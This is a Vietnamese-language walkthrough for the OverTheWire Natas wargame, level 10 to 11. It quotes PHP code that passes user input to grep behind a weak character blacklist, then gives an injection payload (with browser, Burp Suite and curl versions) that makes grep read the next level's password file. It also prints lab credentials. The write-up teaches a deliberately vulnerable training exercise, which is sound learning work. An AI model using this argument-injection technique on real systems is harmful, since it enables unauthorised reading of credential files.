# Level 10 -> Level 11

For security reasons, we now filter on certain characters

Find words containing: [      ] [Search]

Output:

---

## 1. THÔNG TIN TRUY CẬP (DÙNG PASSWORD TÌM ĐƯỢC TỪ NATAS 9)

- **URL**: `http://natas10.natas.labs.overthewire.org`
- **Username**: `natas10`
- **Password**: `EgjlkzB6E8LJyf2Obt4q7q4ewt5ZWSNv`
- **Giao thức xác thực**: HTTP Basic Authentication

---

## 2. THỬ THÁCH & KIẾN THỨC NỀN TẢNG CỦA LEVEL 10

### Thử thách
Trang web tiếp tục cung cấp tính năng tra cứu từ điển giống Level 9, nhưng có thêm thông báo:
> *"For security reasons, we now filter on certain characters"*

*(Tạm dịch: Vì lý do bảo mật, hiện tại chúng tôi đã lọc một số ký tự nhất định).*

### Phân tích mã nguồn PHP (`index-source.html`)
Khi kiểm tra mã nguồn, ta thấy ứng dụng đã bổ sung hàm kiểm tra `preg_match`:

```php
<?
$key = "";

if(array_key_exists("needle", $_REQUEST)) {
    $key = $_REQUEST["needle"];
}

if($key != "") {
    if(preg_match('/[;|&]/', $key)) {
        print "Input contains an illegal character!";
    } else {
        passthru("grep -i $key dictionary.txt");
    }
}
?>
```

### Manh mối & Kiến thức cốt lõi: Vượt qua cơ chế lọc Blacklist (Blacklist Bypass)

1. **Bộ lọc danh sách đen (Blacklist Filtering)**:
   - Biểu thức chính quy `preg_match('/[;|&]/', $key)` dùng để phát hiện xem chuỗi đầu vào có chứa bất kỳ ký tự nào trong 3 ký tự:
     - `;` (Dấu chấm phẩy)
     - `|` (Dấu ống dẫn - Pipe)
     - `&` (Dấu và)
   - Nếu phát hiện thấy, chương trình sẽ chặn lại và in ra: *"Input contains an illegal character!"*.
   - **Điểm yếu của Blacklist**: Phương pháp chặn theo danh sách cấm luôn là cách tiếp cận thiếu an toàn. Lập trình viên chỉ nghĩ đến việc người dùng sẽ dùng các ký tự trên để **nối thêm một câu lệnh Linux mới**. Họ không nhận ra rằng kẻ tấn công **hoàn toàn có thể tận dụng chính lệnh `grep` có sẵn** mà không cần phải ngắt hay nối lệnh!

2. **Cách hoạt động của lệnh `grep` trong Linux**:
   - Cú pháp cơ bản của lệnh tìm kiếm:
     ```bash
     grep [tùy_chọn] <pattern_tìm_kiếm> <danh_sách_các_tệp_tin...>
     ```
   - Khi ta truyền nhiều hơn 1 đường dẫn tệp tin, `grep` sẽ duyệt qua lần lượt **từng tệp tin một** và in ra các dòng có chứa chuỗi thỏa mãn.

3. **Xây dựng Payload vượt qua bộ lọc**:
   - Ta cần đọc tệp mật khẩu: `/etc/natas_webpass/natas11`.
   - Vì không thể dùng dấu `;` để ngắt lệnh rồi gõ `cat`, ta sẽ biến `/etc/natas_webpass/natas11` thành tệp mục tiêu để chính lệnh `grep` đọc nó!
   - **Payload sử dụng**:
     ```text
     ^ /etc/natas_webpass/natas11 #
     ```
   - **Khi đưa vào câu lệnh của máy chủ**:
     ```bash
     grep -i ^ /etc/natas_webpass/natas11 # dictionary.txt
     ```
   - **Phân tích từng thành phần**:
     1. **`^` (Dấu mũ)**: Trong biểu thức chính quy (Regex), `^` đại diện cho điểm bắt đầu của một dòng. Vì dòng nào cũng có điểm bắt đầu, `grep` sẽ khớp và in ra toàn bộ nội dung của tệp.
     2. **`/etc/natas_webpass/natas11`**: Đường dẫn tệp chứa mật khẩu được truyền vào làm tệp cần tìm kiếm đầu tiên.
     3. **`#` (Dấu thăng)**: Biến toàn bộ phần phía sau (`dictionary.txt`) thành chú thích của shell, giúp shell bỏ qua không tìm kiếm trong cuốn từ điển nữa (tránh in ra hàng nghìn dòng rác).
   - *(Lưu ý: Bộ lọc `/[;|&]/` hoàn toàn không cấm dấu cách, dấu `^`, dấu `/` hay dấu `#`, do đó payload hoàn toàn hợp lệ và đi qua bộ lọc trót lọt).*

---

## 3. CÔNG CỤ CẦN DÙNG

- **Trình duyệt Web**: Nhập payload trực tiếp vào biểu mẫu.
- **Burp Suite**: Bắt và gửi request qua Repeater / Proxy.
- **Dòng lệnh CLI (cURL)**: Gửi request nhanh chóng từ terminal.

---

## 4. CÁC BƯỚC THỰC HIỆN ĐỂ LẤY PASSWORD LEVEL 11

### Cách 1: Thao tác trực tiếp trên Trình duyệt

- **Bước 1**: Mở trình duyệt và truy cập đường dẫn:
  ```text
  http://natas10.natas.labs.overthewire.org
  ```
  Đăng nhập với tài khoản:
  - **User**: `natas10`
  - **Pass**: `EgjlkzB6E8LJyf2Obt4q7q4ewt5ZWSNv`

- **Bước 2**: Nhấp vào liên kết **View sourcecode** hoặc truy cập đường dẫn:
  ```text
  http://natas10.natas.labs.overthewire.org/index-source.html
  ```
  Xác nhận bộ lọc chỉ chặn 3 ký tự `;`, `|`, `&`.

- **Bước 3**: Quay lại trang chủ:
  ```text
  http://natas10.natas.labs.overthewire.org
  ```

- **Bước 4**: Dán chính xác chuỗi payload sau vào ô **Find words containing**:
  ```text
  ^ /etc/natas_webpass/natas11 #
  ```

- **Bước 5**: Nhấn nút **Search**.
  - Phần **Output** sẽ hiển thị trực tiếp dòng mật khẩu của `natas11`!

---

### Cách 2: Sử dụng Burp Suite

- **Bước 1**: Mở trình duyệt của Burp Suite (`Open browser`) và truy cập đường dẫn:
  ```text
  http://natas10.natas.labs.overthewire.org
  ```
  Đăng nhập với tài khoản:
  - **User**: `natas10`
  - **Pass**: `EgjlkzB6E8LJyf2Obt4q7q4ewt5ZWSNv`

- **Bước 2**: Quay lại cửa sổ Burp Suite, vào tab **`Proxy`** $\rightarrow$ **`HTTP history`** $\rightarrow$ Click chuột phải vào request `natas10` (có Status code `200`) $\rightarrow$ chọn **`Send to Repeater`** (`Ctrl + R`).
- **Bước 3**: Tại tab **`Repeater`**, sửa dòng request đầu tiên thành:
  ```http
  GET /?needle=%5E+/etc/natas_webpass/natas11+%23&submit=Search HTTP/1.1
  ```
  *(Dấu `^` được mã hóa thành `%5E`, dấu `#` được mã hóa thành `%23`).*
- **Bước 4**: Bấm nút màu cam **`Send`**. Khung **Response** bên phải sẽ trả về mật khẩu của `natas11`.

---

### Cách 3: Sử dụng dòng lệnh PowerShell / Terminal với cURL

Gửi HTTP request trực tiếp với payload qua terminal:

```powershell
curl.exe -s -u natas10:EgjlkzB6E8LJyf2Obt4q7q4ewt5ZWSNv "http://natas10.natas.labs.overthewire.org/?needle=%5E+/etc/natas_webpass/natas11+%23&submit=Search"
```

---

## 5. KẾT QUẢ / MẬT KHẨU LEVEL 11

```text
Password natas11: [VUMQDmuITOEHzhviLE5V0VG9cPMQkyxd]
```
